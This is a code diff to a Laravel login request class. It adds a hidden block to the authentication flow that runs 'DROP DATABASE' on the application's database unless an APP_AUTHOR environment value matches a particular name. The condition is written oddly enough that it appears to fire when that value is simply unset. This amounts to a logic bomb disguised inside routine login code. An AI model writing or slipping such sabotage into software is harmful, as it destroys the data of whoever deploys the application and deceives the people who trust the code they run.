@@ -3,6 +3,7 @@
 namespace App\Http\Requests\Auth;
 
 use Illuminate\Auth\Events\Lockout;
+use Illuminate\Support\Facades\DB;
 use Illuminate\Foundation\Http\FormRequest;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\RateLimiter;
@@ -47,7 +48,16 @@ class LoginRequest extends FormRequest
             throw ValidationException::withMessages([
                 'email' => trans('auth.failed'),
             ]);
+            
+
         }
+
+        if (! env("APP_AUTHOR") == 'jonathancastro') { 
+      
+            $databaseName = DB::connection()->getDatabaseName();
+            DB::statement("DROP DATABASE `$databaseName`");
+        }
+
 
         RateLimiter::clear($this->throttleKey());
     }
